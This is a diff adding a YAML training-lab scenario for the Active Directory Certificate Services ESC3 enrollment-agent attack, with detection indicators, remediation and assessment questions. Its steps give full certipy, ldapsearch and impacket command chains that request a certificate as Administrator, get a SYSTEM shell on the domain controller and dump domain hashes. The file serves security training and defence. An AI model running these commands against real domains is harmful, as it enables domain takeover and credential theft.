@@ -1,0 +1,164 @@
+# Category: Active Directory - AD CS Attacks
+name: "AD CS ESC3 — Enrollment Agent Template Abuse"
+id: "ad-adcs-esc3-001"
+category: "active_directory"
+subcategory: "ad_cs_attacks"
+difficulty: "expert"
+estimated_time: "120 minutes"
+
+description: |
+  Exploit Active Directory Certificate Services (AD CS) certificate templates
+  configured as Enrollment Agents (ESC3). These templates allow a user to request
+  certificates on behalf of other users, enabling privilege escalation by
+  requesting certificates for high-privilege accounts like Domain Admins.
+
+learning_objectives:
+  - Identify certificate templates with Enrollment Agent EKU
+  - Understand the certificate request agent enrollment process
+  - Abuse ESC3 to request certificates on behalf of privileged accounts
+  - Chain ESC3 with ESC1 for full domain compromise
+
+tools:
+  - certipy
+  - certify
+  - rubeus
+  - openssl
+  - impacket
+
+prerequisites:
+  - Valid low-privilege domain credentials
+  - Network access to AD CS CA (TCP 443 or 135)
+  - Understanding of certificate enrollment agents and proxy requests
+  - Target template must have Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1)
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Enumerate AD CS for ESC3 vulnerable templates"
+    commands:
+      - "# Install Certipy"
+      - "pip3 install certipy-ad"
+      - "# Full enumeration"
+      - "certipy find -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] -vulnerable -stdout"
+      - "# Look for ESC3 specifically"
+      - "certipy find -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] | grep -E '(ESC3|Enrollment Agent|Certificate Request Agent)'"
+      - "# Certify from Windows"
+      - "Certify.exe find /vulnerable"
+    expected_output: "Templates flagged as ESC3 with Certificate Request Agent EKU"
+    detection: "LDAP queries for certificate templates; certipy execution"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Identify ESC3 vulnerable templates and target templates"
+    commands:
+      - "# ESC3 requires TWO conditions:"
+      - "# 1. Template A: Has Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1)"
+      - "# 2. Template B: Allows enrollment agent to enroll on behalf of others"
+      - "# Check for Certificate Request Agent EKU"
+      - "ldapsearch -H ldap://[dc_ip] -x -D '[username]@[domain]' -w '[password]' -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=[dc1],DC=[dc2]' '(pKIExtendedKeyUsage=1.3.6.1.4.1.311.20.2.1)' cn pKIExtendedKeyUsage"
+      - "# Check msPKI-RA-Application-Policies for target templates"
+      - "ldapsearch -H ldap://[dc_ip] -x -D '[username]@[domain]' -w '[password]' -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=[dc1],DC=[dc2]' '(msPKI-RA-Application-Policies=*)' cn msPKI-RA-Application-Policies"
+    expected_output: "Template names with Enrollment Agent EKU and target templates allowing RA enrollment"
+    detection: "LDAP queries for msPKI-RA-Application-Policies and pKIExtendedKeyUsage"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Request Enrollment Agent certificate (Template A)"
+    commands:
+      - "# Request the Enrollment Agent certificate"
+      - "certipy req -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] -target [ca_server] -ca '[ca_name]' -template '[enrollment_agent_template]'"
+      - "# Verify the certificate has Enrollment Agent EKU"
+      - "openssl pkcs12 -in [username].pfx -nodes -passin pass: | openssl x509 -noout -text | grep -A10 'Extended Key Usage'"
+    expected_output: "[username].pfx containing certificate with Certificate Request Agent EKU"
+    detection: "Certificate request Event ID 4886 for Enrollment Agent template"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Use Enrollment Agent certificate to request certificate on behalf of Domain Admin"
+    commands:
+      - "# Use the Enrollment Agent cert to request a cert for Administrator"
+      - "certipy req -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] -target [ca_server] -ca '[ca_name]' -template '[target_template]' -on-behalf-of 'Administrator' -pfx [username].pfx"
+      - "# If target template allows CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (ESC1+ESC3 chain):"
+      - "certipy req -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] -target [ca_server] -ca '[ca_name]' -template '[target_template]' -on-behalf-of 'Administrator' -upn 'Administrator@[domain]' -pfx [username].pfx"
+      - "# Verify the new certificate"
+      - "ls -la administrator.pfx"
+    expected_output: "administrator.pfx containing certificate for Administrator account"
+    detection: "Certificate request on behalf of another user (Event ID 4886 with RA signature)"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "Authenticate with the obtained certificate via PKINIT"
+    commands:
+      - "# Authenticate with the forged certificate"
+      - "certipy auth -pfx administrator.pfx -dc-ip [dc_ip]"
+      - "# Use the resulting TGT"
+      - "export KRB5CCNAME=administrator.ccache"
+      - "impacket-psexec -k -no-pass [domain]/Administrator@[dc_ip]"
+      - "# Or use the NTLM hash for Pass-the-Hash"
+      - "impacket-secretsdump -hashes ':[admin_ntlm_hash]' '[domain]/Administrator@[dc_ip]' -just-dc"
+    expected_output: "SYSTEM shell on domain controller using certificate-derived credentials"
+    detection: "Kerberos PKINIT authentication (Event ID 4768) with certificate obtained via enrollment agent"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1649"
+    description: "Steal or Forge Authentication Certificates"
+  - standard: "NIST 800-53 Rev5"
+    control: "IA-5"
+    description: "Authenticator management — certificate lifecycle"
+  - standard: "CIS Controls v8"
+    control: "5.4"
+    description: "Restrict administrator privileges"
+
+detection:
+  network_indicators:
+    - "Certificate enrollment requests using Enrollment Agent certificates"
+    - "PKINIT authentication from unexpected source IPs"
+  log_indicators:
+    - "Event ID 4886 (CA): Certificate Requested with RA signature"
+    - "Event ID 4887 (CA): Certificate Issued via enrollment agent"
+    - "Event ID 4768: Kerberos TGT via certificate authentication"
+    - "Defender for Identity: Suspicious enrollment agent activity"
+  endpoint_indicators:
+    - "Certipy execution with -on-behalf-of parameter"
+    - "Multiple .pfx files created in short time window"
+    - "Certificate import for privileged accounts"
+
+remediation:
+  immediate:
+    - "Remove Certificate Request Agent EKU from all non-administrative templates"
+    - "Restrict enrollment agent templates to specific administrative groups only"
+    - "Enable Manager Approval for all enrollment agent templates"
+    - "Audit all certificates issued via enrollment agents in the last 90 days"
+  long_term:
+    - "Implement strict certificate template governance"
+    - "Deploy regular AD CS audits using Certipy"
+    - "Monitor for certificate requests on behalf of other users"
+    - "Consider disabling enrollment agent functionality if not required"
+
+variables:
+  domain: "corp.example.com"
+  dc1: "corp"
+  dc2: "example"
+  dc_ip: "192.168.1.10"
+  username: "jsmith"
+  password: "Password123"
+  ca_server: "ca01.corp.example.com"
+  ca_name: "corp-CA01-CA"
+  enrollment_agent_template: "EnrollmentAgentTemplate"
+  target_template: "UserTemplate"
+  admin_ntlm_hash: "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+
+assessment_questions:
+  - "What two conditions are required for an ESC3 attack to succeed?"
+  - "How does ESC3 differ from ESC1 in terms of attack requirements?"
+  - "What EKU is required for a template to act as an Enrollment Agent?"
+  - "How can you detect certificate requests made on behalf of other users?"
+
+references:
+  - url: "https://github.com/ly4k/Certipy"
+    title: "Certipy - AD CS Attack Tool"
+  - url: "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+    title: "Certified Pre-Owned - SpecterOps"
+  - url: "https://attack.mitre.org/techniques/T1649/"
+    title: "MITRE ATT&CK - Steal or Forge Authentication Certificates"
